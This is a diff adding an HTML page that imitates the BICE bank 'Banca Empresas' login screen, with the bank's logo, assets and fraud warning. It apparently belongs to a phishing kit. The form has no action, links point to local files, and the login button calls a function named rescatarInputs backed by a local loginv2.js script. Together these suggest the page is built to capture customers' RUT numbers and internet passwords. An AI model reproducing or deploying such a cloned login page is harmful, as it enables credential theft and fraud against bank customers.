@@ -1,0 +1,135 @@
+<html class=""><head>
+        <meta charset="utf-8">
+        <meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
+        <meta name="robots" content="noindex, nofollow">
+        <title>Inicia sesión en empresas</title>
+        <link rel="icon" type="ico" href="https://auth.bice.cl/resources/wza8e/login/biceEnterpriseThemes/img/biceicon.ico">
+        <link href="https://fonts.googleapis.com/css?family=Poppins:300,400,500,600,700&amp;display=swap" rel="stylesheet">
+                <link href="https://auth.bice.cl/resources/wza8e/login/biceEnterpriseThemes/css/bootstrap.min.css" rel="stylesheet">
+                <link href="https://auth.bice.cl/resources/wza8e/login/biceEnterpriseThemes/css/template.css" rel="stylesheet">
+                <script src="https://auth.bice.cl/resources/wza8e/login/biceEnterpriseThemes/js/jquery.min.js" type="text/javascript"></script>
+                <script src="https://auth.bice.cl/resources/wza8e/login/biceEnterpriseThemes/js/bootstrap.min.js" type="text/javascript"></script>
+
+                <script src="https://auth.bice.cl/resources/wza8e/login/biceEnterpriseThemes/js/imagenes.js" type="text/javascript"></script>
+        <script>
+            (function(s,t,a,n){s[t]||(s[t]=a,n=s[a]=function(){n.q.push(arguments)},
+                n.q=[],n.v=2,n.l=1*new Date)})(window,"InstanaEumObject","ineum");
+            ineum('reportingUrl', 'https://eum-orange-saas.instana.io');
+            ineum('key','KkalW2dASDK5Snnkc3qjww');
+            ineum('trackSessions');
+        </script>
+        <script defer="" crossorigin="anonymous" src="https://eum.instana.io/eum.min.js"></script>
+    </head>
+
+    <body class="">
+
+    <div class="">
+        <div class="">
+            <header class="">
+            </header>
+            <div id="kc-content">
+                <div id="kc-content-wrapper">
+
+    <div class="divAviso" id="divAviso">
+        <div class="container">
+            <div class="d-flex d-gap">
+                <img id="exitImg" src="https://auth.bice.cl/resources/wza8e/login/biceEnterpriseThemes/img/alert_warning.svg">
+                <div>
+                    <p class="text-center pAviso" id="pAviso"><strong class="fw-600">¡No caigas en estafas telefónicas!</strong> Te recordamos que NUNCA te contactará un/a ejecutivo/a BICE para realizar devoluciones de ningún tipo, por ejemplo, comisiones supuestamente cobradas de manera errónea, ni transacciones que requieran tu autorización a través de BICE Pass. <strong class="fw-600">NUNCA ENTREGUES TUS CLAVES</strong>. Ante cualquier sospecha, llámanos al 600 400 2400.</p>
+                </div>
+                <img id="exitAviso" src="https://auth.bice.cl/resources/wza8e/login/biceEnterpriseThemes/img/close.svg" alt="" class="" onclick="closeDiv()" style="cursor: pointer;">
+            </div>
+        </div>
+    </div>
+        <script>
+            ineum('page', 'Spartans/form-login-enterprise');
+        </script>
+       
+       
+        <div id="kc-form">
+            <div id="kc-form-wrapper">
+                    <div class="row mx-0">
+                        <div class="col-ms-12 col-md-6 text-center">
+
+                            <div class="w300 mx-auto">
+        <div id="spacerHead" class="spacerHead spacer32px"></div>
+
+                            </div>
+
+                            <div class="irAlInicio">
+                                <a class="biceClaro" href="./personas.html" target="_top" style="margin-right: 230px;">
+                                    <img src="https://auth.bice.cl/resources/wza8e/login/biceEnterpriseThemes/img/arrow-left.svg" alt="arrow-left">
+                                    <span class="azulBiceClaro" style="">Ir al Inicio</span>
+                                </a>
+                            </div>
+
+                            <div class="text-center headerSignin">
+                                <div class="spacer5"></div>
+                                <img id="firstImg" class="w-186" src="https://auth.bice.cl/resources/wza8e/login/biceEnterpriseThemes/img/logo-bice.svg">
+                                <div class="spacer24px"></div>
+                                <p class="popFont" style="">Te damos la bienvenida a Banca Empresas</p>
+                                <div class="spacer24px"></div>
+                            </div>
+
+                            <form id="kc-form-login"  method="post">
+                    		<input type="hidden" id="idSesion" name="idSesion" autocomplete="idSesion">
+    
+                                    <div class="w300 mx-auto ">
+                                        <label id="labelRut" for="username" class="h40 rutLabel cursorText label-form " onclick="forceFocusRut('username'); moveLabelRut('labelRut')">
+                                            Rut 
+                                        </label>
+
+                                        <input tabindex="1" id="username" class="form-control inputRut h40 w300 " onfocus="focusRut(1);moveLabelRut('labelRut')" onblur="outLabelRut(event,'labelRut');focusRut(0);formatRutPersonas('#username');validInpUsr('username','kc-login');" onkeyup="suppressCharacterRutPersona(event);" name="username" value="" type="text" autocomplete="off">
+                                        <div class="col-md-12 msg-error" style="height: 32px;">
+                                            <div id="textTwo" name="textTwo" class="w300 error-form">
+                                                El Rut no es correcto.</div>
+                                        </div>
+                                    </div>
+
+                                <div class="w300 mx-auto position-relative ">
+                                    <label id="labelPassword" for="password" class="h40 passwordLabel cursorText label-form " onclick="forceFocusPassword('password'); moveLabelPassword('labelPassword')">Clave Internet</label>
+
+                                    <input tabindex="2" id="password" class="form-control h40 w300 letterSpacingPassword inputPassword inputPasswordMD " name="password" type="password" autocomplete="off" onblur="outLabelPassword(event,'password','labelPassword');validInpCtr('password','kc-login');" maxlength="8" onfocus="focusClave(1,'labelPassword');moveLabelPassword('labelPassword')">
+                                    <span class="unselectable" style="margin-left: 115px;position: absolute;z-index: 10;cursor: pointer;top: 15px;" id="showPassword">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span>
+                                    <div class="col-md-12 msg-error" style="height: 32px;">
+                                        <div id="textOne" name="textOne" class="w300 error-form">
+                                            Olvidaste algo...</div>
+                                    </div>
+                                </div>
+                                <div class="col-md-12 h-48">
+                                    <div class="spanpassword">
+                                        <a id="linkClaveInternet" href="./personas.html"><b style="color: #1976D2;cursor: pointer;font-family: Poppins;font-style: normal;font-weight: normal;font-size: 12px;line-height: 18px;text-decoration-line: underline;color: #1976D2; ">
+                                                ¿Tienes problemas con tu clave internet?</b></a>
+                                    </div>
+                                </div>
+                                <div class="w300 mx-auto">
+                                    <input type="hidden" id="id-hidden-input" name="credentialId">
+                                    <input tabindex="4" class="entrar boton btn btn-primary w300    " name="login" id="kc-login" type="submit" onclick="rescatarInputs()" value="Ingresar">
+                                </div>
+                                <div class="spanpassword">
+                                    <img src="https://auth.bice.cl/resources/wza8e/login/biceEnterpriseThemes/img/phone.svg" class="phone-text" alt="phone">
+                                </div>
+
+                            </form>
+                        </div>
+                        <div class="d-none d-md-block col-sm-6 col-lg-6 imagenLogin"></div>
+                    </div>
+            </div>
+        </div>
+                </div>
+            </div>
+
+        </div>
+    </div>
+	<script src="./personas/js/loginv2.js"></script>
+    <script defer="" src="https://static.cloudflareinsights.com/beacon.min.js/v84a3a4012de94ce1a686ba8c167c359c1696973893317" integrity="sha512-euoFGowhlaLqXsPWQ48qSkBSCFs3DPRyiwVu3FjR96cMPx+Fr+gpWRhIafcHwqwCqWS42RZhIudOvEI+Ckf6MA==" data-cf-beacon="{&quot;rayId&quot;:&quot;826d2b458ba916c9&quot;,&quot;version&quot;:&quot;2023.10.0&quot;,&quot;token&quot;:&quot;c933955080d94080adae926aceb659d7&quot;}" crossorigin="anonymous"></script>
+	
+  <div>
+    <p class="legal-center"> <i class="fa fa-copyright" style="margin: 0px;"></i>2023 Todos los
+        Derechos
+        Reservados.</p>
+    <p class="legal-center">Infórmese sobre la garantía estatal de los depósitos en su banco o en
+        www.cmfchile.cl</p>
+  </div>
+    
+</body></html>
